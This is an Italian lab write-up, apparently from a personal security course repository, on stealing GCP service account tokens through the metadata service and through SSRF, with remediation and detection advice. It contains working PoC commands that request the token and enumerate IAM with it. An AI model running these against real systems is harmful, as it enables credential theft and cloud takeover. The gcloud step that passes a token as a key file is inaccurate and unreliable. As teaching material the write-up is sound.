> [English](README.en.md) | **Italiano**

# GCP (Google Cloud Platform) - Metadata SSRF e Service Account Abuse

> - **Fase:** Cloud Security - GCP (IaaS & PaaS)
> - **Visibilita:** Media - le attivita sono registrate in Cloud Audit Logs; l'accesso al metadata service da un workload compromesso e piu difficile da distinguere dal traffico legittimo
> - **Prerequisiti:** Accesso a una risorsa GCP (VM/container compromessi) o credenziali; per l'SSRF, una web app vulnerabile su GCP; gcloud CLI
> - **Output:** Finding CLOUD-004; token del service account; accesso ai servizi GCP con i permessi del service account

- **Ambiente Operativo:** GCP (progetto di laboratorio dell'autore), gcloud CLI
- **Tool principali:** gcloud, GCP metadata API, ScoutSuite

---

## Executive Summary

GCP organizza le risorse in **progetti** e l'accesso attorno ai **Service Account** (SA): identita non umane assegnate a risorse (VM, Cloud Functions, GKE) per accedere ai servizi. Come le managed identity di Azure, i service account eliminano le credenziali hardcoded ma trasferiscono la fiducia alla risorsa - e sono il bersaglio primario di un attacco GCP.

Il vettore distintivo di GCP e l'accesso al **metadata service** (`metadata.google.internal`), che espone il token del service account associato alla risorsa. Due strade vi portano: la compromissione diretta della risorsa (una VM bucata interroga il proprio metadata), o - piu insidiosa - un **SSRF (Server-Side Request Forgery)** su una web app in esecuzione su GCP, che l'attaccante induce a interrogare il metadata service per suo conto, estraendo il token senza nemmeno accedere alla macchina. Il finding CLOUD-004 documenta questo furto di token e il conseguente abuso dei permessi del service account.

Il principio, ancora una volta, e l'identita come perimetro: un service account con permessi eccessivi trasforma un SSRF o una VM compromessa nel controllo del progetto GCP.

---

## Struttura della cartella

```
GCP (Google Cloud Platform)/
+-- README.md      # questo file: metadata SSRF + service account abuse (CLOUD-004)
+-- img/           # furto token e enumerazione permessi
```

---

## Furto del Token del Service Account via Metadata

**ID Finding:** `CLOUD-004` | **Severity:** `Alto` (furto del token del service account via metadata/SSRF; accesso ai servizi GCP con i permessi del SA - `Critico` se il SA e privilegiato)

### Contesto operativo

Il metadata service di GCP fornisce alle risorse i token dei loro service account. Chi puo far interrogare il metadata (dalla risorsa stessa o inducendola via SSRF) ottiene un token OAuth con i permessi del SA. Il caso SSRF e particolarmente grave perche non richiede l'accesso alla macchina: basta una web app che segua una URL fornita dall'attaccante.

### PoC - Furto del token via metadata (da risorsa compromessa)

```Bash
# Da una VM GCP: richiesta del token del service account al metadata service
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

```
{ "access_token": "ya29.c.b0...", "expires_in": 3599, "token_type": "Bearer" }
                                   <-- token del service account (CLOUD-004)
```

### PoC - Furto via SSRF (senza accesso alla macchina)

```Bash
# Web app vulnerabile a SSRF: l'attaccante la induce a interrogare il metadata
curl "https://vuln-app.example/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "X-Forwarded-Header: ..."   # header Metadata-Flavor iniettato via SSRF
```

```
# La risposta della web app contiene il token del SA
"access_token": "ya29.c.b0..."   <-- token esfiltrato via SSRF, nessun accesso alla VM (CLOUD-004)
```

### PoC - Enumerazione e abuso dei permessi

```Bash
# Uso del token rubato per enumerare cosa il service account puo fare
gcloud auth activate-service-account --key-file=<token>
gcloud projects get-iam-policy <project-id>
```

```
role: roles/editor
  members: serviceAccount:sa-web@project.iam.gserviceaccount.com   <-- SA con ruolo Editor (CLOUD-004)
# "Editor" sull'intero progetto = controllo quasi completo delle risorse
```

### Remediation

- **Least privilege sui service account:** ruoli minimi e granulari (mai "Editor"/"Owner" di default); un SA compromesso non deve dare il controllo del progetto
- **Protezione del metadata:** GKE Workload Identity e la metadata concealment proteggono i workload; su GCE, restringere l'accesso al metadata dai container
- **Prevenzione SSRF:** validare e restringere le richieste in uscita delle web app (nessun accesso a `169.254.169.254`/`metadata.google.internal`); e il controllo che spezza il vettore SSRF verso metadata
- **Rilevamento:** ScoutSuite/Prowler per l'audit dei SA sovraprivilegiati; Cloud Audit Logs per l'uso anomalo dei token

---

## Esperienza di Laboratorio

Il vettore SSRF verso metadata e stato il piu istruttivo perche collega due mondi del percorso: la web security (modulo 03) e la cloud security. Un SSRF, che on-premise poteva permettere di raggiungere servizi interni, nel cloud diventa devastante: la web app vulnerabile diventa un proxy verso il metadata service, e l'attaccante ruba il token del service account senza mai toccare la macchina. La stessa vulnerabilita cambia di gravita a seconda del contesto - nel cloud, un SSRF e spesso una via diretta al furto di credenziali.

La simmetria con Azure e stata evidente: metadata service, token dell'identita gestita, permessi ereditati, il tutto quasi identico concettualmente (IMDS su Azure, metadata.google.internal su GCP). Questo ha consolidato il pattern trasversale del cloud: le identita non umane legate alle risorse sono comode e diffuse, e il loro token e sempre a un passo dal metadata service. Chi impara il vettore su un provider lo ritrova sugli altri.

---

## Analisi Teorica: L'SSRF come Amplificatore nel Cloud

L'SSRF illustra come una vulnerabilita cambi gravita col contesto. On-premise, un SSRF permette di raggiungere servizi interni non esposti - grave, ma limitato. Nel cloud, lo stesso SSRF punta al metadata service, un endpoint che per progettazione consegna credenziali a chi lo interroga dall'interno della risorsa. L'SSRF trasforma la web app in quel "chi dall'interno", e la vulnerabilita passa da "accesso a servizi interni" a "furto di credenziali cloud". Il contesto cloud amplifica l'impatto.

La radice e una fiducia implicita basata sulla posizione di rete: il metadata service si fida di chiunque lo raggiunga dall'interno della risorsa, assumendo che sia la risorsa legittima. E lo stesso errore di fiducia basata sulla rete che il modello Zero Trust critica: la posizione (essere "dentro") non dovrebbe conferire fiducia. L'SSRF sfrutta esattamente questa assunzione, prestando alla web app la sua posizione privilegiata. La difesa - restringere le richieste in uscita e proteggere il metadata - e un'applicazione del principio che nessun accesso dovrebbe essere concesso solo in base a "da dove" proviene.

---

## Scenario Reale: Proiezione Post-Exploitation

> Prospettiva dell'attaccante e del difensore.

### Prospettiva Attaccante (Red Team)

**Kill Chain proiettata:**

```
[CLOUD-004] SSRF su web app GCP -> token del service account (Editor)
        |
        v
Accesso alle risorse del progetto: Cloud Storage, BigQuery, Compute
        |
        v
Enumerazione IAM -> ricerca di SA piu privilegiati / impersonation
        |
        v
Esfiltrazione dati / persistenza / controllo del progetto GCP
```

**Impatto potenziale:** un service account con ruolo "Editor" o "Owner" trasforma un SSRF in un controllo quasi completo del progetto. L'accesso a Cloud Storage e BigQuery espone i dati; la possibilita di creare risorse abilita persistenza e abuso (cryptomining). Il pattern SSRF, metadata, service account privilegiato e uno dei vettori cloud piu documentati.

### Prospettiva Difensore (Blue Team)

**IOC:** richieste al metadata da web app (pattern SSRF); uso di token SA da IP/contesti anomali; enumerazione IAM inattesa; creazione di risorse fuori dai processi normali.

**Hardening:** least privilege sui service account (mai Editor/Owner di default); prevenzione SSRF nelle web app; Workload Identity su GKE; metadata concealment; audit continuo con ScoutSuite; Cloud Audit Logs con alerting.

**Lezione difensiva:** nel cloud, un SSRF e un furto di credenziali in potenza. Due difese lo spezzano su livelli diversi: prevenire l'SSRF nell'app (il vettore) e limitare i permessi del service account (l'impatto). La difesa in profondita richiede entrambe - se una fallisce, l'altra contiene il danno.

---

## Tool di riferimento

| Tool | Tipo | Ruolo | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `gcloud` | Cloud CLI | Ufficiale | Interazione con le API GCP |
| GCP metadata API | Endpoint | Vettore | Fonte dei token dei service account |
| `ScoutSuite` | Multi-cloud audit | Difensivo | Audit dei SA sovraprivilegiati e misconfig |
| `GCP IAM Recommender` | Least privilege | Difensivo | Suggerimenti di riduzione dei permessi |
| `Prowler` | Security scanner | Difensivo | Controlli di sicurezza su GCP |

> **Tool moderno consigliato:** difensivamente `ScoutSuite` (`../../../Tooling/scoutsuite/`) per l'audit multi-cloud e l'`IAM Recommender` nativo per il least privilege. La prevenzione SSRF a livello applicativo (modulo 03) e la contromisura che spezza il vettore alla radice.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal Application Access Token | `T1528` | Furto del token del service account via metadata/SSRF (CLOUD-004) |
| Credential Access | Unsecured Credentials: Cloud Instance Metadata API | `T1552.005` | Accesso al metadata service per ottenere le credenziali (CLOUD-004) |
| Discovery | Cloud Infrastructure Discovery | `T1580` | Enumerazione delle risorse e dei permessi del progetto |
| Privilege Escalation | Valid Accounts: Cloud Accounts | `T1078.004` | Abuso dei permessi del service account |

---

> **Nota:** Tutte le attivita documentate sono state condotte su un progetto GCP di laboratorio di proprieta dell'autore. Il test di sicurezza su progetti di terzi richiede autorizzazione esplicita e il rispetto dei termini Google. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
